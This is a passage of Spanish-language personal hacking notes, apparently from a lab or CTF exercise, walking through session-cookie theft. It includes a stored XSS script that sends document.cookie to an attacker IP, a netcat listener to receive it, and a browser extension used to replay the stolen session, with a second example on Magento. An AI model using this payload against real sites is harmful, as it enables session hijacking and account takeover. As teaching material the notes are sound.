Por tanto en este punto, podríamos intentar hacer un robo de cookies, por lo que crearemos otra nota poniendo una dirección URL en la cual el usuario víctima deberá hacer click; y ahí habremos obtenido su cookie de sesión.
Lo guardamos y veremos que hay un intento de imagen cargada en la web, pero que no llega a cargar:
```
<script>img = new Image(); img.src = "http://10.10.16.10/a.php?"+document.cookie;</script>
```

![[Pasted image 20240613001219.png]]

Lo guardamos y nos pondremos en escucha con netcat por el puerto 80 para recibir esa cookie de sesión:
![[Pasted image 20240613001224.png]]

Ahora que ya tenemos la cookie de sesión, sólo tenemos que importarla dentro de nuestro navegador y ya podremos entrar en el panel de login sin proporcionar contraseña, por lo que necesitaremos una extensión del navegador que se llama cookie editor:
![[Pasted image 20240613001229.png]]

La instalamos:
![[Pasted image 20240613001234.png]]

Y ahora en la web y utilizando esta extensión, pondremos la cookie que hemos capturado:
![[Pasted image 20240613001238.png]]

Guardamos y recargamos la página y hemos iniciado sesión:
![[Pasted image 20240613001242.png]]

# EJEMPLO 2
Veremos un ejemplo de haber conseguido una cookie de sesión [[Hacking Magento]]
![[Pasted image 20240613001248.png]]

Y desde la extensión cookie editor tenemos este campo donde podemos poner una cookie de sesión:
![[Pasted image 20240613001253.png]]

Le ponemos la nueva cookie que hayamos capturado:
![[Pasted image 20240613001257.png]]

Recargamos la página y ya estamos dentro:

![[Pasted image 20240613001301.png]]